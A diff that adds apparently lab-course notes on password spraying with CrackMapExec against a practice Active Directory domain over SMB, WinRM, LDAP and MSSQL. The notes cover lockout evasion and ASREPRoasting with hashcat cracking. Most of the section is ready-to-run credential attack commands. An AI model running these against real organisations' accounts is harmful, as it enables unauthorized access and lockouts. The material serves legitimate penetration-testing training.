@@ -93,19 +93,156 @@ Another crucial parameter to enumerate for a password spraying attack is the `Ac
 > Note: CrackMapExec only checks the Default Password Policy, not Password Setting Objects (PSO), if they exist.
 
 
+## Password Spraying
+
+- **Password Attack with a File with Usernames and a Single Password**
+```
+crackmapexec smb 10.129.203.121 -u users.txt -p Inlanefreight01!
+```
+
+- **Password Attack with a List of Usernames and a Single Password**
+```
+crackmapexec smb 10.129.203.121 -u noemi david grace carlos -p Inlanefreight01!
+```
+
+- **Password Attack with a List of Usernames and Two Passwords**
+```
+crackmapexec smb 10.129.203.121 -u noemi grace david carlos -p Inlanefreight01! Inlanefreight02!
+```
+
+- **Continue on Success**
+```
+crackmapexec smb 10.129.203.121 -u noemi grace david carlos -p Inlanefreight01! Inlanefreight02! --continue-on-success
+```
+
+- **Password Attack with a List of Usernames and a Password List**
+```
+crackmapexec smb 10.129.203.121 -u users.txt -p passwords.txt
+```
+
+- **Checking One User Equal to One Password with a Wordlist**
+Another great feature of CME is if we know each user's password, and we want to test if they are still valid. For that purpose, use the option --no-bruteforce. This option will use the 1st user with the 1st password, the 2nd user with the 2nd password, and so on.
+```
+crackmapexec smb 10.129.203.121 -u userfound.txt -p passfound.txt --no-bruteforce --continue-on-success
+```
+
+- **Testing Local Accounts**
+In case we would like to test a local account instead of a domain account, we can use the `--local-auth` option in CrackMapExec:
+
+```
+crackmapexec smb 192.168.133.157 -u Administrator -p Password@123 --local-auth
+```
+
+### Account Lockout
+Be careful when performing Password Spraying. We need to ensure the value: `Account Lockout Threshold` is set to None. If there is a value (usually 5), be careful with the number of attempts we try on each account and observe the window in which the counter is reset to 0 (typically 30 minutes). Otherwise, there is a risk that we lock all accounts in the domain for 30 minutes or more (check the Locked Account Duration for how long this is). Occasionally a domain password policy will be set to require an administrator to manually unlock accounts which could create an even bigger issue if we lock out one or more accounts with careless Password Spraying. If you already have a user account, you can query its `Bad-Pwd-Count` attribute, which measures the number of times the user tried to log on to the account using an incorrect password.
+
+- **Query Bad Password Count**
+```
+crackmapexec smb 10.129.203.121 --users -u grace -p Inlanefreight01!
+```
+
+> Note: The Bad Password Count resets if the user authenticates with the correct credentials.
+
+## Account Status
+When we test an account, there are three colors that CME can display:
+- **Green**: The username and the password is valid.
+- **Red**: The username or the password is invalid.
+- **Magenta**: The username and password are valid, but the authentication is not successful.
+
+Authentication can be unsuccessful while the password is still valid for various reasons. Here is a complete list:
+- STATUS_ACCOUNT_DISABLED
+- STATUS_ACCOUNT_EXPIRED
+- STATUS_ACCOUNT_RESTRICTION
+- STATUS_INVALID_LOGON_HOURS
+- STATUS_INVALID_WORKSTATION
+- STATUS_LOGON_TYPE_NOT_GRANTED
+- STATUS_PASSWORD_EXPIRED
+- STATUS_PASSWORD_MUST_CHANGE
+- STATUS_ACCESS_DENIED
+
+Depending on the reason, for example, `STATUS_INVALID_LOGON_HOURS` or `STATUS_INVALID_WORKSTATION` may be a good idea to try another workstation or another time. In the case of the message `STATUS_PASSWORD_MUST_CHANGE`, we can change the user's password using Impacket `smbpasswd` like: `smbpasswd -r domain -U user`.
+
+- **Changing Password for an Account with Status `PASSWORD_MUST_CHANGE`**
+```
+smbpasswd -r 10.129.203.121 -U peter
+```
+
+## Target Protocol WinRM
+
+To connect to the WinRM service on a remote computer, we need to have local administrator privileges, be a member of the Remote Management Users group, or have explicit permissions for PowerShell Remoting in the session configuration.
+
+WinRM is not the best protocol to identify if a password is valid because it will only indicate that the account is valid if it has access to WinRM.
+
+- **WinRM - Password Spraying**
+```
+crackmapexec winrm 10.129.203.121 -u userfound.txt -p passfound.txt --no-bruteforce --continue-on-success
+```
+
+## LDAP - Password Spraying
+
+When doing Password Spraying against the LDAP protocol, we **need to use the FQDN** otherwise, we will receive an error:
+
+Error when using the IP:
+```
+crackmapexec ldap 10.129.203.121 -u julio grace -p Inlanefreight01!
+```
+
+We have two options to solve this issue: configure our attack host to use the domain name server (DNS) or configure the KDC FQDN in our `/etc/hosts` file. Let's go with the second option and add the FQDN to our `/etc/hosts` file:
 
 
+1. Adding the FQDN to the hosts file and Performing a Password Spray
+2. Spray:
+```
+crackmapexec ldap dc01.inlanefreight.htb -u julio grace -p Inlanefreight01!
+```
+
+## MSSQL Authentication Mechanisms
+
+MSSQL supports two authentication modes, which means that users can be created in Windows or the SQL Server:
+- Windows authentication mode	This is the default, often referred to as integrated security, because the SQL Server security model is tightly integrated with Windows/Active Directory. Specific Windows user and group accounts are trusted to log in to SQL Server. Windows users who have already been authenticated do not have to present additional credentials.
+- Mixed mode	Mixed mode supports authentication by Windows/Active Directory accounts and SQL Server. Username and password pairs are maintained within SQL Server.
 
 
+This means that we can have three types of users to authenticate to MSSQL:
+1. Active Directory Account.
+2. Local Windows Account.
+3. SQL Account.
 
 
+- **Password Spray - Active Directory Account**
+For an Active Directory account, we need to specify the domain name:
+```
+crackmapexec mssql 10.129.203.121 -u julio grace jorge -p Inlanefreight01! -d inlanefreight.htb
+```
 
+- **Password Spray - Local Windows Account**
+For a local Windows Account, we need to specify a dot (.) as the domain option -d or the target machine name:
+```
+crackmapexec mssql 10.129.203.121 -u julio grace -p Inlanefreight01! -d .
+```
 
+- **Password Spray - SQL Account**
+If we want to try a SQL Account, we need to specify the flag `--local-auth`
+```
+crackmapexec mssql 10.129.203.121 -u julio grace  -p Inlanefreight01! --local-auth
+```
 
+## Finding ASREPRoastable Accounts
 
+The ASREPRoast attack looks for users without Kerberos pre-authentication required. That means that anyone can send an AS_REQ request to the KDC on behalf of any of those users and receive an AS_REP message. This last kind of message contains a chunk of data encrypted with the original user key derived from its password. Then, using this message, the user password could be cracked offline if the user chose a relatively weak password.
 
+- **Bruteforcing Accounts for ASREPRoast**
+We can use the LDAP protocol with the list of users we previously found with the option `--asreproast` followed by a file name and specify the **FQDN** of the DC as a target. We will search for each account inside the file `users.txt` to identify if there is a least one account vulnerable to this attack:
+```
+crackmapexec ldap dc01.inlanefreight.htb -u users.txt -p '' --asreproast asreproast.out
+```
 
+Based on our list, we found one account vulnerable to ASREPRoasting. We can request all accounts that do not require Kerberos pre-authentication if we have valid credentials. Let's use Grace's credentials to request all accounts vulnerable to ASREPRoast.
 
-
-
-
+- **Search for ASREPRoast Accounts**
+```
+crackmapexec ldap dc01.inlanefreight.htb -u grace -p Inlanefreight01! --asreproast asreproast.out
+```
+```
+hashcat -m 18200 asreproast.out /usr/share/wordlists/rockyou.txt
+```
